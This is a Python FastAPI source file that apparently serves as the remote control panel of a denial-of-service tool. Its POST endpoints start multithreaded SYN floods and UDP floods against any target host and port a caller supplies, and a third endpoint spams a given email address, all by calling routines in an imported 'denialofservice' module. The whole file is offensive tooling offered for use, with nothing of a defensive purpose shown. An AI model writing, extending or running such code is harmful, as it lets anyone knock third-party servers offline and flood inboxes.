from base64 import encode
from fastapi import APIRouter, Request
from denialofservice import Layer4
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log

layer4_router = APIRouter()

@layer4_router.post("/synflood")
async def syn_flood(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.syn_flood, args=(target, port, time,))
            t.start()
        log.info(f"{target}:{port} SYN-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target}:{port} SYN-Flood from {request.client.host} for {time} seconds could not be triggered")

@layer4_router.post("/udpflood")
async def udp_flood(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.udp_flood, args=(target, port, time,))
            t.start()
        log.info(f"{target}:{port} UDP-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target}:{port} UDP-Flood from {request.client.host} for {time} seconds could not be triggered")
        
@layer4_router.post("/emailspam")
async def email_spam(time: int, receivermail: str, message: str, request: Request):
    try:
        t = Thread(target=Layer4.email_spam, args=(receivermail, time, message,))
        t.start()
        log.info(f"{receivermail} EMAIL-Spammed from {request.client.host} for {time} seconds")
    except Exception as e:
        print(e)
        log.warning(f"{receivermail} EMAIL-Spam from {request.client.host} for {time} seconds could not be triggered")
